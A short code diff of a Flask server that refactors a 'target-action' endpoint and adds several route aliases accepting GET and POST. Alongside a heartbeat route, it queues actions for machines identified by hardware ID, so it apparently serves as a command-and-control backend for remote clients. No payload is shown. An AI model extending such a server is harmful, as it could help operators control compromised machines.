@@ -42,8 +42,7 @@ def heartbeat():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
-@app.route('/api/target-action', methods=['POST'])
-def target_action():
+def handle_target_action():
     try:
         data = request.get_json(silent=True) or request.form
         hwid = data.get('hwid')
@@ -58,6 +57,14 @@ def target_action():
         return jsonify({"status": "success", "message": f"Action '{action}' successfully queued for {hwid}!"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
+
+# Lahat ng posibleng route variation para maiwasan ang 404
+@app.route('/api/target-action', methods=['POST', 'GET'])
+@app.route('/api/target-action/', methods=['POST', 'GET'])
+@app.route('/target-action', methods=['POST', 'GET'])
+@app.route('/target-action/', methods=['POST', 'GET'])
+def target_action():
+    return handle_target_action()
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
